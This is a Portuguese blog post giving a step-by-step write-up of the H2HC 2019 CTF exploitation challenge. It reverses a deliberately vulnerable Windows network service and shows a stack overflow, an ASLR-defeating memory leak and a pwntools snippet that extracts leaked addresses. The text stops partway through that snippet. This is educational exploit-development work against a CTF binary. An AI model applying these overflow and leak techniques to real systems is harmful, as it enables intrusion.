---
layout: post
title: "[CTF - Writeup] Exploit H2HC 2019"
date: 2019-11-05 23:56:57.000000000 -03:00
type: post
parent_id: '0'
published: true
password: ''
status: publish
categories:
- IT
tags: []
meta:
  _edit_last: '1'
  _yoast_wpseo_content_score: '60'
  _yoast_wpseo_primary_category: ''
  _aviaLayoutBuilder_active: ''
  _aviaLayoutBuilderCleanData: ''
  layout: ''
  sidebar: ''
  footer: ''
  header_title_bar: ''
  header_transparency: ''
  _avia_hide_featured_image: '0'
  _syntaxhighlighter_encoded: '1'
  _yoast_wpseo_focuskw: CTF - Writeup - Resolução do desafio de Exploração na H2HC
    2019
  _yoast_wpseo_metadesc: Resolução passo a passo do desafio de exploitation do CTF
    H2HC 2019.
  _yoast_wpseo_linkdex: '55'
  _av_alb_posts_elements_state: a:0:{}
  _av_el_mgr_version: '1.0'
  _av_alb_element_mgr_version: 1.0.1
  _av_css_styles: a:6:{s:7:"post_id";i:2002;s:8:"css_file";s:13:"post-2002.css";s:9:"timestamp";s:0:"";s:6:"status";s:6:"no_css";s:13:"processed_ids";a:0:{}s:13:"include_posts";a:0:{}}
author: Helvio Junior (m4v3r1ck)







permalink: "/it/ctf-exploit-h2hc-2019/"
---
<h2>0x00 - Introdução</h2>
<p>Este ano (2019) tive o privilégio de participar da <a href="https://www.h2hc.com.br/h2hc/pt/">H2HC</a> e durante a conferência teve um desafio CTF do qual eu participei com alguns amigos. O jogo começo com um desafio de engenharia reversa e outro de exploitation. Neste post iremos reproduzir passo a passo o processo de exploração deste exploit.</p>
<h2>0x01 - Escopo</h2>
<p>Para este desafio nos foi entregue um binário, o mesmo disponível no link (<a href="{{ site.baseurl }}/assets/2019/11/h2hc_2019_ctf.zip">h2hc_2019_ctf</a>), com uma descrição "Para o desafio de exploração o exploit deve funcionar no Windows 10 com full ASLR e outras mitigações habilitadas", sendo assim temos de montar um ambiente com Windows 10 atualizado e com as proteções de memória (ASLR e DEP) habilitadas.</p>
<p><!--more--></p>
<h2>0x02 - Enumeração</h2>
<p>Como qualquer exploração, uma das principais fases é a enumeração, então vamos lá.</p>
<h3>0x0201 - Hashes</h3>
<p>[sourcecode language="shell"]# md5sum h2hc.exe<br />
ca3c795f41b65cc298a87027869a111d  h2hc.exe</p>
<p># sha1sum h2hc.exe<br />
20976f919b8ca7430e73e51fbd826dc570fa03d2  h2hc.exe<br />
[/sourcecode]</p>
<p>Utilizando o <strong>readpe</strong> do Kali podemos ver diversas informações da aplicação, abaixo segue o output de algumas partes, que extrairemos informações importantes.</p>
<p>[sourcecode language="shell"]# readpe --all h2hc.exe<br />
DOS Header<br />
    Magic number:                    0x5a4d (MZ)<br />
    Bytes in last page:              144<br />
    Pages in file:                   3<br />
    Relocations:                     0<br />
    Size of header in paragraphs:    4<br />
    Minimum extra paragraphs:        0<br />
    Maximum extra paragraphs:        65535<br />
    Initial (relative) SS value:     0<br />
    Initial SP value:                0xb8<br />
    Initial IP value:                0<br />
    Initial (relative) CS value:     0<br />
    Address of relocation table:     0x40<br />
    Overlay number:                  0<br />
    OEM identifier:                  0<br />
    OEM information:                 0<br />
    PE header offset:                0xe0<br />
COFF/File header<br />
    Machine:                         0x8664 IMAGE_FILE_MACHINE_AMD64<br />
    Number of sections:              5<br />
    Date/time stamp:                 1568413383 (Fri, 13 Sep 2019 22:23:03 UTC)<br />
    Symbol Table offset:             0<br />
    Number of symbols:               0<br />
    Size of optional header:         0xf0<br />
    Characteristics:                 0x22<br />
    Characteristics names<br />
                                         IMAGE_FILE_EXECUTABLE_IMAGE<br />
                                         IMAGE_FILE_LARGE_ADDRESS_AWARE<br />
Optional/Image header<br />
    Magic number:                    0x20b (PE32+)<br />
    Linker major version:            10<br />
    Linker minor version:            0<br />
    Size of .text section:           0x8200<br />
    Size of .data section:           0x7c00<br />
    Size of .bss section:            0<br />
    Entrypoint:                      0x1aa8<br />
    Address of .text section:        0x1000<br />
    ImageBase:                       0x140000000<br />
    Alignment of sections:           0x1000<br />
    Alignment factor:                0x200<br />
    Major version of required OS:    5<br />
    Minor version of required OS:    2<br />
    Major version of image:          0<br />
    Minor version of image:          0<br />
    Major version of subsystem:      5<br />
    Minor version of subsystem:      2<br />
    Size of image:                   0x14000<br />
    Size of headers:                 0x400<br />
    Checksum:                        0<br />
    Subsystem required:              0x3 (IMAGE_SUBSYSTEM_WINDOWS_CUI)<br />
    DLL characteristics:             0x8140<br />
    DLL characteristics names<br />
                                         IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE<br />
                                         IMAGE_DLLCHARACTERISTICS_NX_COMPAT<br />
                                         IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE<br />
    Size of stack to reserve:        0x100000<br />
    Size of stack to commit:         0x1000<br />
    Size of heap space to reserve:   0x100000<br />
    Size of heap space to commit:    0x1000</p>
<p>...</p>
<p>Imported functions<br />
    Library<br />
        Name:                            KERNEL32.dll<br />
        Functions<br />
            Function<br />
                Name:                            WinExec<br />
            Function<br />
                Name:                            GetCommandLineA</p>
<p>...</p>
<p>Sections<br />
    Section<br />
        Name:                            .text<br />
        Virtual Address:                 0x1000<br />
        Physical Address:                0x8027<br />
        Size:                            0x8200 (33280 bytes)<br />
        Pointer To Data:                 0x400<br />
        Relocations:                     0<br />
        Characteristics:                 0x60000020<br />
        Characteristic Names<br />
                                             IMAGE_SCN_CNT_CODE<br />
                                             IMAGE_SCN_MEM_EXECUTE<br />
                                             IMAGE_SCN_MEM_READ</p>
<p>[/sourcecode]</p>
<p>Neste output algumas informações são importantes:</p>
<ul>
<li>ImageBase: <strong>0x140000000</strong></li>
<li>Address of .text section: <strong>0x1000</strong></li>
<li>Imported functions contains: <strong>WinExec</strong></li>
</ul>
<h3>0x0202 - ROP Gadgets</h3>
<p>Como este exploit será com proteções de memória ASLR + DEP, inevitavelmente iremos utilizar a técnica de ROP, então ainda no Kali já vamos pegar os gadgets</p>
<p>Utilizando a ferramenta ROP disponível em <a href="https://github.com/JonathanSalwan/ROPgadget">https://github.com/JonathanSalwan/ROPgadget</a> podemos obter todos os endereços que utilizemos futuramente</p>
<p>[sourcecode language="shell"]# ROPgadget --binary h2hc.exe<br />
Gadgets information<br />
============================================================<br />
0x000000014000567b : adc ah, bl ; add byte ptr [rax], al ; inc edx ; jmp 0x140005669<br />
0x000000014000323b : adc al, 0 ; add byte ptr [rbp - 0x74f78b40], al ; retf<br />
0x0000000140002276 : adc al, 0x48 ; add esp, 0x28 ; ret<br />
...<br />
...<br />
...<br />
0x00000001400036d7 : xor esi, dword ptr [rcx + rdx - 1] ; ret 0xff49<br />
0x0000000140008c0f : xor rax, rax ; ret</p>
<p>Unique gadgets found: 1048<br />
[/sourcecode]</p>
<p>Este comando nos retornou 1048 gadgets.</p>
<h3>0x0203 - Interagindo com a aplicação</h3>
<p>Vamos então começar a brincadeira e interagir com a aplicação.</p>
<p>Abrinda a aplicação no Windows podemos ver que a mesma realiza um bind na porta 54345</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-05-at-17.26.53.png"><img class="aligncenter wp-image-2010" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-05-at-17.26.53.png" alt="" width="600" height="354" /></a></p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-05-at-17.31.24.png"><img class="aligncenter wp-image-2011" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-05-at-17.31.24.png" alt="" width="500" height="69" /></a></p>
<p>&nbsp;</p>
<p>Podemos ver que há mensagens mostradas na console da aplicação</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-05-at-17.32.31.png"><img class="aligncenter wp-image-2012" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-05-at-17.32.31.png" alt="" width="600" height="169" /></a></p>
<h2>0x03 - Entendendo a aplicação</h2>
<p>Como vimos anteriormente a aplicação espera uma espécie de cabeçalho (header) para realizar a comunicação, sendo assim será necessário realizar a engenharia reversa da mesma, para esta tarefa utilizaremos a ferramenta Ghidra disponível em <a href="https://ghidra-sre.org/">https://ghidra-sre.org/</a>.</p>
<p>Neste passo irei gastar um pouco mais de tempo para entendermos o fluxo da aplicação, fluxo este que determinará no sucesso do nosso overflow.</p>
<p>Analisando o comportamento da aplicação podemos ver que ela imprime em tela algumas mensagens como "Server listenning", Waiting for H2HC evil connections", sendo assim vamos começar procurando pela função que imprime essas mensagens.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/socket.png"><img class="alignnone size-full wp-image-2016" src="{{ site.baseurl }}/assets/2019/11/socket.png" alt="" width="2880" height="1416" /></a></p>
<p>Na posição 140001520 encontramos essa função na qual detém o pseudocode conforma abaixo</p>
<p>[sourcecode language="c"]<br />
/* WARNING: Removing unreachable block (ram,0x000140001608) */</p>
<p>void FUN_140001520(undefined4 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)</p>
<p>{<br />
  ulonglong uVar1;<br />
  undefined *puVar2;<br />
  longlong *plVar3;<br />
  undefined4 local_res8 [8];<br />
  longlong local_48;<br />
  undefined4 local_40 [2];<br />
  undefined local_38 [32];<br />
  longlong local_18;</p>
<p>  local_res8[0] = param_1;<br />
  FUN_140001000((longlong)local_res8);<br />
  uVar1 = FUN_1400010a0();<br />
  if ((int)uVar1 == 0) {<br />
    FUN_1400011c0(s_[-]_Socket_support_version_error_14000d0c8,param_2,param_3,param_4);<br />
  }<br />
  else {<br />
    plVar3 = &amp;amp;amp;amp;amp;amp;amp;local_48;<br />
    puVar2 = (undefined *)0xd449;<br />
    uVar1 = FUN_140001110(s_0.0.0.0_14000d0f0,0xd449,plVar3);<br />
    if ((int)uVar1 != 0) {<br />
      FUN_1400011c0(s_[+]_Server_listening_14000d128,puVar2,plVar3,param_4);<br />
      do {<br />
        while( true ) {<br />
          FUN_1400011c0(s_[+]_Waiting_for_H2HC_evil_connec_14000d140,puVar2,plVar3,param_4);<br />
          local_40[0] = 0x10;<br />
          plVar3 = (longlong *)local_40;<br />
          puVar2 = local_38;<br />
          local_18 = FUN_140001210(local_48,puVar2,plVar3);<br />
          if (local_18 != -1) break;<br />
          FUN_1400011c0(s__[-]_Client_socket_error_14000d168,puVar2,plVar3,param_4);<br />
        }<br />
        FUN_1400011c0(s__[+]_New_connection_accepted_14000d188,puVar2,plVar3,param_4);<br />
        FUN_140001480(local_18);<br />
        FUN_1400011c0(s__[+]_Closing_connection_14000d1a8,puVar2,plVar3,param_4);<br />
        FUN_140001300(local_18);<br />
      } while( true );<br />
    }<br />
    FUN_1400011c0(s_[-]_It_was_not_possible_to_bind:_14000d100,s_0.0.0.0_14000d0f8,0xd449,param_4);<br />
  }<br />
  FUN_140001050((longlong)local_res8);<br />
  return;<br />
}<br />
[/sourcecode]</p>
<p>Quando uma conexão é recebida a mesma é tratada pela função localizada na posição 140001480, aqui nomeada FUN_140001480.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/trata_conn.png"><img class="alignnone size-full wp-image-2018" src="{{ site.baseurl }}/assets/2019/11/trata_conn.png" alt="" width="2880" height="1418" /></a></p>
<p>Que temos o seu pseudocode abaixo</p>
<p>[sourcecode language="c"]void FUN_140001480(undefined8 param_1)</p>
<p>{<br />
  uint uVar1;<br />
  ulonglong uVar2;<br />
  undefined8 uVar3;<br />
  undefined8 uVar4;<br />
  undefined8 local_res8 [4];<br />
  int local_10;<br />
  uint local_c;</p>
<p>  local_res8[0] = param_1;<br />
  FUN_140001000((longlong)local_res8);<br />
  uVar4 = 0;<br />
  uVar3 = 8;<br />
  uVar1 = FUN_140001260(local_res8[0],&amp;amp;amp;amp;amp;amp;amp;local_10,8,0);<br />
  uVar2 = (ulonglong)uVar1;<br />
  FUN_1400011c0(s__[+]_Header_received:_%i_bytes_14000d068,uVar2,uVar3,uVar4);<br />
  if (uVar1 == 8) {<br />
    if (local_10 == 0x43483248) {<br />
      FUN_140001380(local_res8[0],(ulonglong)local_c,uVar3,uVar4);<br />
    }<br />
    else {<br />
      FUN_1400011c0(s__[-]_Error:_Invalid_cookie_14000d0a8,uVar2,uVar3,uVar4);<br />
    }<br />
  }<br />
  else {<br />
    FUN_1400011c0(s__[-]_Error:_Invalid_header_14000d088,uVar2,uVar3,uVar4);<br />
  }<br />
  FUN_140001050((longlong)local_res8);<br />
  return;<br />
}<br />
[/sourcecode]</p>
<p>&nbsp;</p>
<p>Essa função recebe os dados que enviamos, separando um header de um body, tendo o header em <strong>local_10</strong> e o body <strong>local_res8.</strong></p>
<p>A aplicação realiza as seguintes ações de checagem:</p>
<ol>
<li>Verifica se o header tem 8 bytes;</li>
<li>Verifica se o header é igual a <strong>0x43483248</strong> que decodando o hexa chegamos ao texto <strong>H2HC</strong>;</li>
<li>Caso ocorra as duas condições a função FUN_140001380 é chamada.</li>
</ol>
<p>Sendo assim nosso header deve conter 8 bytes, onde os 4 primeiros é o texto H2HC e os 4 bytes subsequentes é o tamanho do body enviado, conforme veremos abaixo.</p>
<p>Segue abaixo o pseudocódigo da função FUN_140001380</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/trata_body.png"><img class="alignnone size-full wp-image-2019" src="{{ site.baseurl }}/assets/2019/11/trata_body.png" alt="" width="2880" height="1416" /></a></p>
<p>[sourcecode language="c"]void FUN_140001380(undefined8 param_1,undefined8 param_2,undefined8 param_3,undefined8 param_4)</p>
<p>{<br />
  uint uVar1;<br />
  ulonglong uVar2;<br />
  undefined *puVar3;<br />
  undefined8 uVar4;<br />
  undefined8 local_res8;<br />
  uint local_res10;<br />
  undefined local_118 [252];<br />
  int local_1c;<br />
  int local_18;</p>
<p>  local_res10 = (uint)param_2;<br />
  local_18 = local_1c;<br />
  local_res8 = param_1;<br />
  FUN_140001000((longlong)&amp;amp;amp;amp;amp;amp;amp;local_res8);<br />
  if (local_res10 &amp;amp;amp;amp;amp;amp;lt; 0x101) {<br />
    uVar4 = 0;<br />
    uVar2 = (ulonglong)(local_res10 + local_18);<br />
    uVar1 = FUN_140001260(local_res8,local_118,local_res10 + local_18,0);<br />
    FUN_1400011c0(s__[+]_Message_received:_%i_bytes_14000d000,(ulonglong)uVar1,uVar2,uVar4);<br />
    puVar3 = local_118;<br />
    sprintf(&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,s_[+]_H2HC19_message:_%s_14000d028);<br />
    FUN_1400011c0(&amp;amp;amp;amp;amp;amp;amp;DAT_14000d040,&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,puVar3,uVar4);<br />
    FUN_1400012b0(local_res8,&amp;amp;amp;amp;amp;amp;amp;DAT_14000e4a0,local_res10 + local_18,0);<br />
  }<br />
  else {<br />
    FUN_1400011c0(s__[-]_Error:_Invalid_size_14000d048,param_2,param_3,param_4);<br />
  }<br />
  FUN_140001050((longlong)&amp;amp;amp;amp;amp;amp;amp;local_res8);<br />
  return;<br />
}<br />
[/sourcecode]</p>
<p>Essa é a função que realiza o tratamento do body enviado, nela podemos ver que uma das primeiras verificações é se o tamanho (que foi passado no header é menor que <strong>0x101</strong>). Caso seja menor chama a função <strong>FUN_140001260</strong> que na verdade é um alias para a função de socket que recebe os dados, posteriormente mostra a mensagem "[+] Message received..." em tela com o uso da função <strong>FUN_1400011c0</strong>, utiliza o sprintf para imprimir o texto recebido em tela, em seguida executa as funções <strong>FUN_1400011c0</strong> e <strong>FUN_1400012b0</strong>. Em qualquer condição sempre executa a função <strong>FUN_140001050</strong>.</p>
<p>De forma simples a função <strong>FUN_1400012b0</strong> realiza o envio dos dados para o cliente via socket.</p>
<p>Vamos dar uma pausa na análise do código para fazer uns testes e verificar se o que vimos realmente é o que acontece.</p>
<p>Duas funções creio que seja melhor olharmos elas no debugger para ilustrar melhor o seu funcionamento.</p>
<p>Função <strong>FUN_140001260</strong> que realiza o recebimento dos dados via rede.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/recv.png"><img class="alignnone size-full wp-image-2045" src="{{ site.baseurl }}/assets/2019/11/recv.png" alt="" width="1152" height="304" /></a></p>
<p>Função <strong>FUN_1400012b0</strong> que realiza o envio dos dados via rede</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/send.png"><img class="alignnone size-full wp-image-2046" src="{{ site.baseurl }}/assets/2019/11/send.png" alt="" width="1162" height="290" /></a></p>
<h3></h3>
<h3>0x0301 - PoCs</h3>
<p>Vamos então tentar enviar a String H2HC seguido de um tamanho menor que o 0x0101 e um buffer.</p>
<p>No exemplo abaixo fiz uma PoC passando como tamanho 5 bytes, mas enviando um buffer maior. Como visto a aplicação tratou os 5 bytes e retornou somente os primeiro 5 bytes da mensagem.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-07.56.07.png"><img class="alignnone size-full wp-image-2023" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-07.56.07.png" alt="" width="2110" height="182" /></a></p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-07.56.25.png"><img class="alignnone size-full wp-image-2024" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-07.56.25.png" alt="" width="1448" height="338" /></a></p>
<p>Vamos agora tentar passar um tamanho maior que os 0x101. Podemos ver que não houve retorno por parte da aplicação e que na console da mesma foi apresentado um erro de tamanho inválido.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.00.47.png"><img class="alignnone size-full wp-image-2025" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.00.47.png" alt="" width="2094" height="152" /></a></p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.01.00.png"><img class="alignnone size-full wp-image-2026" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.01.00.png" alt="" width="1448" height="328" /></a></p>
<p>Fazendo mais um teste vamos passar o valor máximo possível 0x100. Nessa condição podemos ver que ocorreu uma falha na aplicação. Mas não podemos nos empolgar, essa falha ainda não nos dá condição de execução de um código arbitrário.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.04.55.png"><img class="alignnone size-full wp-image-2027" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.04.55.png" alt="" width="2850" height="198" /></a></p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.05.09.png"><img class="alignnone size-full wp-image-2028" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.05.09.png" alt="" width="1450" height="840" /></a></p>
<h3>0x0302 - Análise dinâmica até este ponto.</h3>
<p>Analisando um pouco mais a fundo podemos ver que na função FUN_140001050 temos a opção de manipular o endereço de retorno.</p>
<p>Em um fluxo normal, onde passamos um tamanho de no máximo 0xff, temos o comportamento normal da aplicação</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.58.39.png"><img class="alignnone size-full wp-image-2031" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.58.39.png" alt="" width="2852" height="188" /></a></p>
<p>Primeiramente é atribuído a EAX o valor que está no endereço de memória final e5b4 que corresponde ao hexa 0x04</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.54.16-1.png"><img class="alignnone size-full wp-image-2039" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.54.16-1.png" alt="" width="2880" height="1082" /></a></p>
<p>Posteriormente atribui a RCX o valor da posição de memória final e5b8 cujo o seu valor é 0x00</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.55.04-1.png"><img class="alignnone size-full wp-image-2035" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.55.04-1.png" alt="" width="2880" height="1080" /></a></p>
<p>E se utiliza desses 2 valores para cacular o endereço que posteriormente será usado como endereço de retorno da função FUN_140001380 que chamou essa função (FUN_140001050).</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.55.39-1.png"><img class="alignnone size-full wp-image-2036" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.55.39-1.png" alt="" width="2880" height="1082" /></a></p>
<p>E como podemos ver no topo da pilha no momento do ret da função FUN_140001380 está o endereço que foi calculado anteriormente, desta forma a aplicação chamará como proxima instrução este endereço.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.56.03.png"><img class="alignnone size-full wp-image-2038" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-08.56.03.png" alt="" width="2880" height="1094" /></a></p>
<p>Quando passamos o valor 0x100 como tamanho podemos ver que o os valores em ...e5b4 e ...e5b8 são adulterados e consequentemente o endereço de retorno é alterado.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-09.14.07.png"><img class="alignnone size-full wp-image-2040" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-09.14.07.png" alt="" width="2850" height="190" /></a></p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-09.16.05.png"><img class="alignnone size-full wp-image-2041" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-09.16.05.png" alt="" width="2880" height="1092" /></a></p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-09.17.04.png"><img class="alignnone size-full wp-image-2042" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-09.17.04.png" alt="" width="2880" height="1074" /></a></p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-09.17.47.png"><img class="alignnone size-full wp-image-2043" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-09.17.47.png" alt="" width="2880" height="1064" /></a></p>
<p>O problema é que como esse (0x100) é o valor que podemos passar, não temos como fazer de forma direta uma substituição desses valores para que possamos efetivamente manipular o ret de forma que possamos passar valores de endereço válido.</p>
<p>Após uma análise mais profunda e diversos testes encontrei que a vulnerabilidade pela qual é possível realizar o controle ro RET, é aliada com a que mostramos anteriormente, mas ela ocorre somente após o segundo envio de dados.</p>
<p>Em uma tentativa de ilustrar melhor o que ocorre (antes de vermos o código da aplicação), a aplicação recebe os dados na pilha atual (no tamanho especificado pelo usuário até 0x100), mas para realizar isso realiza a soma 2 valores para definir esse tamanho que será recebido, a falha ocorre exatamente neste ponto. Um dos valores da soma é o que o usuário passou 0x00 até 0x0100) e o outro é ums posição de memória, o problema que essa posição de memória está 252 bytes (Hexa: 0xFC) a frente da posição de memória onde é salvo os dados recebidos do socket, como nós podemos gravar até 256 bytes (Hexa: 0x0100), podemos substituir esse valor do cálculo.</p>
<p>Segue abaixo os prints das evidencias do teste</p>
<p>Comandos sequenciais para evidenciar a falha</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-11.42.25.png"><img class="alignnone size-full wp-image-2054" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-11.42.25.png" alt="" width="2128" height="132" /></a></p>
<p>Note o endereço para o qual serão enviados os dados (<strong>0xc7f5e0</strong>) bem como os dados que estão na pilha.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-11.26.23-1.png"><img class="alignnone size-full wp-image-2055" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-11.26.23-1.png" alt="" width="2880" height="1342" /></a></p>
<p>Agora logo após a execução da função de recebimento dos dados.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-11.29.38.png"><img class="alignnone size-full wp-image-2056" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-11.29.38.png" alt="" width="2880" height="1334" /></a></p>
<p>Agora executamos o segundo comando</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-11.53.14.png"><img class="alignnone size-full wp-image-2051" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-11.53.14.png" alt="" width="2850" height="352" /></a></p>
<p>Observe agora os valores de RAX e RCX, onde RAX recebe o valor que está na posição 252 do nosso buffer, e o RCX recebe o valor 05, que foi o tamanho passado por mim, e a soma dos 2 vai ocorrer podendo assim extrapolar os 256 bytes de limite da aplicação.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-11.44.10.png"><img class="alignnone size-full wp-image-2057" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-11.44.10.png" alt="" width="2878" height="848" /></a></p>
<p>&nbsp;</p>
<h3>0x0303 - Memory Address Leak.</h3>
<p>Para que possamos redirecionar o fluxo da aplicação para um endereço de POP POP RET ou outro qualquer que desejamos, se faz necessário conhecer o endereçamento atual da execução e como a aplicação e o Sistema Operacional estão com as proteções de memória Habilitadas (neste caso ASLR).</p>
<p>Para que a aplicação nos envie os dados, ela faz um cálculo um pouco diferente, usando outras posições de memória, mas igualmente podendo serem manipuladas por nós.</p>
<p>Segue abaixo as 2 linhas responsáveis por explorar a vulnerabilidade do leak.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-12.16.53.png"><img class="alignnone size-full wp-image-2058" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-12.16.53.png" alt="" width="2854" height="394" /></a></p>
<p>Observe que os registradores RAX e RCX receberam os dados desejados.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-12.17.11.png"><img class="alignnone size-full wp-image-2059" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-12.17.11.png" alt="" width="2880" height="846" /></a></p>
<p>Que posteriormente serão utilizados como terceiro parâmetro da função Send do Socket que por sua vez é o parâmetro que define o tamanho do buffer que será enviado</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-12.19.10.png"><img class="alignnone size-full wp-image-2060" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-12.19.10.png" alt="" width="2880" height="1444" /></a></p>
<p>Neste ponto vamos escrever nosso primeiro PoC do exploit. Neste exploit ainda não temos uma versão funcional do Leak, pois precisaremos realizar alguns ajustes para que o mesmo funcione corretamente (próximo assunto que abordaremos). Adicionalmente iremos utilizar a biblioteca <a href="http://docs.pwntools.com">pwnlib</a> para nos facilitar no processo de exploit.</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/ctf/blob/master/2019_H2HC/exploit/01_poc.py"></script></p>
<h3>0x0303 - Retomada do fluxo.</h3>
<p>Para que a nossa aplicação nos retorno os dados se faz necessário ajustar nosso payload para que o endereço no topo da pilha (conforme vimos em <strong>0x0302 - Análise dinâmica até este ponto</strong>).</p>
<p>Abaixo temos o novo script, nele podemos observar que removi os últimos bytes do segundo payload para que tenhamos um endereço de retorno viável, pois com eles estavam sendo substituídos os endereços que a aplicação usa para controle.</p>
<p><script src="https://gist-it.appspot.com/github/helviojunior/ctf/blob/master/2019_H2HC/exploit/02_ret_addr.py"></script></p>
<p>Ajustamos os ultimos 4 bytes para ser 0x040090000 de forma que o byte 0x04 é usado (dentro da função FUN_140001050) para ser o RAX que será posteriormente multiplicado a 8 e somado a um endereço para calcular o endereço que ficará como sendo o endereço no topo da pilha para ser usado no RET, sendo assim o endereço das próximas instruções da nossa aplicação.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-15.23.09.png"><img class="alignnone size-full wp-image-2063" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-15.23.09.png" alt="" width="2880" height="878" /></a></p>
<p>Segue abaixo a imagem do endereço calculado no topo da pilha.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-15.25.51.png"><img class="alignnone size-full wp-image-2064" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-15.25.51.png" alt="" width="2880" height="982" /></a></p>
<p>Mas temos que lembrar que este conjunto de 4 bytes são os usados como tamanho de retorno dos dados por parte da função send do socket (como cimos anteriormente). Sendo assim para que tenhamos o leak de diversos endereços que precisamos colocar no mínimo 2308 bytes (Hexa: 0x0904).</p>
<p>Como resultado da execução podemos ver que tivemos um retorno de 0xa03 bytes, sendo que diversos deles são leaks de endereços da aplicação.</p>
<p><a href="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-16.14.47.png"><img class="alignnone size-full wp-image-2065" src="{{ site.baseurl }}/assets/2019/11/Screen-Shot-2019-11-06-at-16.14.47.png" alt="" width="1616" height="1158" /></a></p>
<p>Utilizando o trecho de código abaixo podemos capturar e tratar os dados recebidos a fim de extrair os endereços desejados.</p>
<p>[sourcecode language="python"]p1.recvuntil(&quot;H2HC19 message:&quot;)</p>
<p>#Leak de um endereço no próprio fluxo de execução da aplicação (Sessão .text)<br />
p1.recv(0x10d)<br />
ld1 = p1.recv(8)<br />
leak_local_addr  = u64(ld1.ljust(8, &quot;\x00&quot;))</p>
<p>base_addr = leak_local_addr &amp;amp;amp; 0xffffffffffff0000</p>
<p>log.info(&quot;Local leak   : %s&quot; % hex(leak_local_addr))<br />
log.info(&quot;App Base Addr   : %s&quot; % hex(base_addr))</p>
<p># Leak do endereço da função WinExec<br />
p1.recv(0x7f0) #offset entre a posição zero até o 90 f0 7e 0a  fa 7f<br />
lead_data = p1.recv(8)<br />
